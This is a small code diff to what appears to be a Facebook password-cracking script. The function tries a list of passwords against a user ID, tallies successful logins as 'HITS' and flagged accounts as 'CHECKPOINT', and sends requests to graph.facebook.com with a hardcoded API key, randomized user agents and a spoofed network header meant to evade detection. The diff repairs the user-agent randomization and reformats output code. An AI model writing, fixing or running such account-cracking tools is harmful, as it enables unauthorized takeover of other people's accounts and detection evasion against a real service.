@@ -355,7 +355,8 @@ def gxds_files(uid, pwx):
     global oks, loop, cps
     sys.stdout.write(
         f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "
-    ); sys.stdout.flush()
+    )
+    sys.stdout.flush()
     session = requests.Session()
     try:
         for ps in pwx:
@@ -383,7 +384,7 @@ def gxds_files(uid, pwx):
                     "api_key": "882a8490361da98702bf97a021ddc14d",
                 }
             headers = {
-                "User-Agent": gxdsUArndm(),
+                "User-Agent": random.choice(gxdsUArndm),
                 "Content-Type": "application/x-www-form-urlencoded",
                 "Host": "graph.facebook.com",
                 "X-FB-Net-HNI": str(random.randint(20000, 40000)),
